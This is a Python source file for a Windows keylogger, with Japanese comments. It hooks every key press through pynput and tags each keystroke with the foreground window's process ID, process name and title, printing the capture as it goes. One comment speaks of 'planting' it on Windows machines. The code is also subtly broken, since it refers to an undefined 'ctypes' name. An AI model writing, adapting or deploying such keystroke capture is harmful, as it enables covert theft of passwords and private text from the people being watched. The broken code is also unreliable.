from pynput import keyboard # 実行前に pip install pynput をする必要があるかもしれない
from ctypes import *
from ctypes.wintypes import *   # Windows でしか使うことができないライブラリのため、Windows 以外に仕掛けることができない
 
proc_status = None

def get_name_by_pid(pid):   # PID からプロセス名を取得する関数
    PROCESS_ALL_ACCESS = 0x1f0fff
    hProcess = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if hProcess == 0:
        return None
    buf = ctypes.create_unicode_buffer(1024)
    ret = ctypes.windll.psapi.GetModuleBaseNameW(hProcess, 0, buf, len(buf))
    if ret == 0:
        return None
    return buf.value

def get_hwnd_n_pid():   # フォアグラウンドで動いているウィンドウの PID を取得する関数
    hwnd = windll.user32.GetForegroundWindow()
    pid = ctypes.c_ulong()
    windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
    return hwnd, pid.value

def get_window_title(hwnd, pid):    # ウィンドウに表示されているタイトルを取得する関数
    length = windll.user32.GetWindowTextLengthW(hwnd)
    buf = create_unicode_buffer(length + 1)
    windll.user32.GetWindowTextW(hwnd, buf, length + 1)
    return buf.value

def on_press(key):  # キー操作を記録するメイン関数
    global proc_status
    try:
        hwnd, pid = get_hwnd_n_pid()
        pid_name = get_name_by_pid(pid)
        window_title = get_window_title(hwnd, pid)
        if proc_status == window_title:
            pass
        else:
            print("pid:{0} [{1}] [{2}]".format(pid, pid_name, window_title))
            proc_status = window_title
        print(key.char, end="")
    except AttributeError:
        if key.name == "shift" or key.name == "alt_l":
            print(" [{}]".format(key.name), end="")
        else:
            print(" [{}]".format(key.name))

def on_release(key):    # キーロガーを終了する際に ESC を入寮するようにする
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:   # マルチスレッド処理を実行する関数
    listener.join()

